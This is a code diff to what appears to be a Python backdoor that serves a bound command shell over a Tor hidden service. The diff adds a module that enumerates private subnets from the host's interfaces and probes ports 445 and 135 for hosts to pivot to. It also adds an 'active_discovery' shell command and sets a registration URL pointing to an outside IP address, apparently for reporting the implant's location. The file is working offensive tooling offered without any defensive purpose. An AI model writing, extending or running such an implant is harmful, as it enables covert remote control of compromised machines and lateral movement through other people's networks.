@@ -8,8 +8,11 @@ import queue
 import shlex
 import base64
 import socket
+import psutil
+import ipcalc
 import requests
 import threading
+import ipaddress
 import subprocess
 import socketserver
 import stem.control
@@ -23,12 +26,12 @@ auth_provider = TOTP("")
 hidden_service_provider = None
 
 
-class HiddenServiceProvider:
+class HiddenServiceProvider(object):
 
     def __init__(self, port, reporting_address):
         self._bind_port = port
         self._reporting_address = reporting_address
-        self._data_dir = getattr(sys, "_MEIPASS", os.getcwd())
+        self._data_dir = getattr(sys, "_MEIPASS", os.path.join(os.getcwd(), "bin"))
         self._tor_exe = os.path.join(self._data_dir, "tor.exe")
         self._tor_process_handle = None
         self._stem_controller = None
@@ -79,9 +82,46 @@ class HiddenServiceProvider:
             self._tor_process_handle.kill()
 
 
-class ProcessExecWrapper:
+class ActiveDiscoveryModule(object):
 
-    def __init__(self, process_handle, timeout=30):
+    def __init__(self):
+        self.addresses_pending_scan = []
+        self.pivotable_addresses = []
+
+    @staticmethod
+    def _subnet_mask_to_cidr(address):
+        return sum([bin(int(x)).count('1') for x in address.split('.')])
+
+    def calculate_pending_addresses(self):
+        addresses = psutil.net_if_addrs()
+        for interface_name in addresses:
+            try:
+                netmask = addresses[interface_name][1].netmask
+                address = addresses[interface_name][1].address
+                if netmask:
+                    cidr_mask = self._subnet_mask_to_cidr(netmask)
+                    if ipaddress.ip_address(address).is_private and not address.startswith("169.254"):
+                        self.addresses_pending_scan.extend([str(x) for x in ipcalc.Network(f"{address}/{cidr_mask}")])
+            except ValueError:
+                continue
+
+    def scan_pending_addresses(self):
+        for address in self.addresses_pending_scan:
+            try:
+                for port in [445, 135]:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    s.settimeout(0.1)
+                    s.connect((address, port))
+                print(f"[+] Found pivotable address: {address}")
+                self.pivotable_addresses.append(address)
+            except Exception as e:
+                continue
+
+
+class ProcessExecWrapper(object):
+
+    def __init__(self, process_handle, timeout=60):
         self._exit_code = None
         self._timeout = timeout
         self._reset_time = timeout
@@ -252,6 +292,16 @@ class BoundShell(socketserver.StreamRequestHandler):
                 elif command.lower() == "teardown":
                     tear_down = True
                     response = "Terminating bound shell and hidden service."
+                elif command.lower() == "active_discovery":
+                    scanner = ActiveDiscoveryModule()
+                    scanner.calculate_pending_addresses()
+                    self.request.sendall(bytes(f"Scanning {len(scanner.addresses_pending_scan)} possible addresses.", 'utf-8'))
+                    prompt = str(self.rfile.readline().strip(), "utf-8")
+                    if prompt and prompt[0] == "c":
+                        scanner.scan_pending_addresses()
+                        response = "Available addresses:\r\n\t" + "\r\n\t".join(scanner.pivotable_addresses)
+                    else:
+                        response = "Aborting"
                 else:
                     response = self._execute_command(command)
             else:
@@ -275,7 +325,7 @@ class BoundShell(socketserver.StreamRequestHandler):
 if __name__ == "__main__":
     bind_port = 42309
     bind_addr = "0.0.0.0"
-    registration_addr = ""
+    registration_addr = "http://18.188.178.14:8080/"
     try:
         hidden_service_provider = HiddenServiceProvider(bind_port, registration_addr)
         hidden_service_provider.create_service()
